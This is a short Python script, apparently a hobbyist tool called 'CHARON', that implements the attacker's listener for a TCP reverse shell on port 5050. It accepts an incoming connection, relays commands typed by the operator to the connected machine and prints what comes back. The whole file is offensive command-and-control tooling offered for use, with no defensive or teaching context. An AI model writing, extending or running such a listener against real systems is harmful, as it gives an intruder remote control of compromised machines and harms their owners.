# CHARON :
# socket program for create simple tcp revese shell on port 5050 for server [Best Shell]

from socket import *

server = "0.0.0.0"
port = 5050
ADDR = (server,port)

s = socket(AF_INET, SOCK_STREAM)
s.bind((ADDR))
s.listen(5)

print("[+] server is running on port 5050...")

c, adr = s.accept()
print("[+] connected to : %s \n" % str(adr))

while True:
     
    shell = input(c.recv(1024).decode('utf-8'))

    if shell == None or shell == '' or shell == '\n':
        c.sendall('-'.encode('utf-8'))
        continue

    c.sendall(shell.encode('utf-8'))
    data = c.recv(102343).decode('utf-8')
    print(data+"\n")

c.close